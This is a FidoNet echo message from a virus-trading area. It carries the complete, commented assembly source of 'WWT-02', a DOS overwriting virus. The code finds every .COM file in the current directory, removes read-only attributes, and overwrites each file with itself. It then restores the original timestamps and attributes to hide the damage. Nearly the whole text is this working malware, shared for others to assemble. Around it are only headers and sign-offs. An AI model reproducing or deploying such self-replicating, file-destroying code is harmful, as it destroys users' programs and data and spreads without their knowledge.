;Ä PVT.VIRII (2:465/65.4) ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ PVT.VIRII Ä
; Msg  : 1 of 61
; From : MeteO                               2:5030/136      Tue 09 Nov 93 09:09
; To   : -  *.*  -                                           Fri 11 Nov 94 08:10
; Subj : WWT_02.ASM
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;.RealName: Max Ivanov
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;* Kicked-up by MeteO (2:5030/136)
;* Area : VIRUS (Int: ˆ­ä®p¬ æ¨ï ® ¢¨pãá å)
;* From : Graham Allen, 2:283/718 (06 Nov 94 16:06)
;* To   : Bill Dirks
;* Subj : WWT_02.ASM
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;@RFC-Path:
;ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
;18.n283!not-for-mail
;@RFC-Return-Receipt-To: Graham.Allen@f718.n283.z2.fidonet.org
; Virus name        WWT-02
; Description       Attack any COM file in current directory
; Comment       Don't change Date/Time, ignore ReadOnly
; Date          19 Dec 1990    15:30
; Place         CICTT
;
segment code
org 100h
begin:        mov dx,offset FileMask  ; FileMask for any COM file
        mov ah,4eh          ; Find first file
        mov cx,1            ; including attrib Archive
        int 21h         ; Call DOS
        jnc Ok          ; If no error -> go on
        jmp short Exit      ; If error -> exit program

Ok
        call    Infect          ; Do infection

DoNext
        mov dx,80h          ; Set DS:DX to DTA
        mov ah,4fh          ; Find Next file
        int 21h         ; Call DOS
        jnc NextOk          ; If no error -> go on
        jmp short Exit      ; If error -> exit
NextOk
        jmp short Ok        ; Still next file exist

Exit
        int 20h         ; Exit to DOS

Infect
        mov dx,9eh          ; Set DS:DX to filename in DTA
        mov ax,4300h        ; Get file attribute
        int 21h         ; Call DOS
        mov Attrib,cx       ; Save attribute for later
        xor cx,cx           ; New attribute -> normal file
        mov ax,4301h        ; Set attribute
        int 21h         ; Call DOS
        mov ax,3d02h        ; Open file for Read/Write
        int 21h         ; Call DOS
        jc  Exit            ; If error -> exit
        mov bx,ax           ; Save handle
        mov ax,5700h        ; Get file Date/Time
        int 21h         ; Call DOS
        mov Date,dx         ; Save date
        mov Time,cx         ; Save time
        mov dx,100h         ; DS:DX point to itself
        mov ah,40h          ; Write to handle
        mov cx,offset VirusSize-100h    ; Write only virus
        int 21h         ; Call DOS
        mov ax,5701h        ; Restore Date/Time
        mov cx,Time         ; Old time
        mov dx,Date         ; Old time
        int 21h         ; Call DOS
        mov ah,3eh          ; Close file
        int 21h         ; Call DOS
        mov dx,9eh          ; Set DS:DX to filename in DTA
        mov cx,Attrib       ; Restore attribute
        mov ax,4301h        ; Set file attribute
        int 21h         ; Call DOS
        ret             ; Return to caller


FileMask
        db  '*.COM',0               ; File mask for any COM file
Date
        dw  ?
Time
        dw  ?
Attrib
        dw  ?
VirusSize
        db  ?           ; Used to calculate virus
                        ; size
code ends
end begin
;-+-  FidoPCB v1.4 [NR]
; + Origin: <Rudy's Place - Israel> Hard disks never die... (2:283/718)
;=============================================================================
;
;Yoo-hooo-oo, -!
;
;
;    þ The MeÂeO
;
;/3            Enable 32-bit processing
;
;--- Aidstest Null: /Kill
; * Origin: ùPVT.ViRIIúmainúboardú / Virus Research labs. (2:5030/136)

